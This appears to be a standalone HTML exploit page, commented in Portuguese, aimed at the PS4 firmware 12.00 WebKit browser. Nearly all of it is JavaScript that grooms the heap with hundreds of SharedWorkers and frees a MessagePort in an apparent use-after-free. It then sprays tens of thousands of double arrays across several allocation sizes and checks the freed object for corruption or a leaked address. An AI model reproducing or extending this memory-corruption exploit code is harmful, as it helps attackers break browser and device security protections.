<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 SHOTGUN SPRAY</title>
    
</head>
<body>

    <h1>PS4 12.00 - SHOTGUN SPRAY</h1>
    <h3>Estratégia: Inundar com múltiplos tamanhos (0x60 - 0x140)</h3>
    
    <button onclick="run_shotgun()">DISPARAR ESCOPETA</button>
    <div id="status">Pronto.</div>
    <div id="log"></div>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            var color = type === "success" ? "#0f0" : "#ccc";
            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. CONFIGURAÇÃO MULTI-CALIBRE
        // =================================================================
        // Lista de todos os tamanhos suspeitos para objetos WebKit pequenos
        var SHOTGUN_SIZES = [
            0x60, 0x70, 0x80, 
            0x90, 0xA0, 0xB0, 
            0xC0, 0xD0, 0xE0, 
            0x100, 0x120, 0x140
        ];

        // Cache dos payloads prontos
        var PAYLOADS = {};

        function prepare_ammo() {
            log("Preparando munição (Double Arrays)...");
            
            for (let size of SHOTGUN_SIZES) {
                // Header do Array ~= 16 bytes.
                // Elementos = (Tamanho - 16) / 8
                var count = Math.floor((size - 16) / 8);
                if (count < 1) count = 1;
                
                var arr = new Array(count);
                // Preenche com 1.1 (0x3FF1...)
                // Seguro para Userland, fatal se lido como ponteiro Kernel
                for(var k=0; k<arr.length; k++) arr[k] = 1.1;
                
                PAYLOADS[size] = arr;
            }
            log(`${SHOTGUN_SIZES.length} calibres prontos.`);
        }

        // =================================================================
        // 2. EXECUÇÃO
        // =================================================================
        var workers = [];

        async function run_shotgun() {
            if(!window.SharedWorker) return log("Erro: Navegador.");
            
            prepare_ammo();

            // GROOMING (380)
            log("Grooming...");
            for(let i=0; i<380; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // TRIGGER (403)
            var p_count = 0;
            var limit = 403 - 380;

            var it = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO !!!");
                    
                    // VÍTIMA
                    var v = workers.pop();
                    var p = v.port;
                    
                    // FREE
                    v.port.close();
                    v = null;
                    
                    // SHOTGUN SPRAY
                    // Injeta todos os tamanhos em sequência rápida
                    // Isso "suja" todos os baldes de alocação próximos
                    log("Spraying Múltiplo...");
                    
                    var spray_stash = [];
                    
                    // 5000 cópias de CADA tamanho
                    // Total: ~60.000 objetos. Seguro para a RAM (alguns MBs).
                    for (let size of SHOTGUN_SIZES) {
                        var ammo = PAYLOADS[size];
                        for(let k=0; k<5000; k++) {
                            spray_stash.push(ammo.slice(0));
                        }
                    }

                    // CHECK
                    setTimeout(() => {
                        try {
                            var s = p.toString();
                            
                            if (s.indexOf("MessagePort") === -1) {
                                log("!!! SUCESSO ABSOLUTO !!!", "success");
                                log("Objeto Corrompido: " + s, "success");
                                alert("LEAK ENCONTRADO! Algum tamanho funcionou.");
                            } else {
                                log("Falha: Objeto intacto.");
                                // Força bruta final
                                try { let x = p.onmessage; } catch(e) {
                                    if(e.toString().match(/0x/)) alert("LEAK NO ERRO: " + e);
                                }
                            }
                        } catch(e) {
                            log("ERRO CRÍTICO (BOM): " + e, "success");
                        }
                        
                        // Limpeza
                        workers.forEach(w => { try{w.port.close()}catch(e){} });
                        spray_stash = [];
                        
                    }, 500);
                    
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+p_count);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
                p_count++;
            }, 60);
        }
    </script>
</body>
</html>
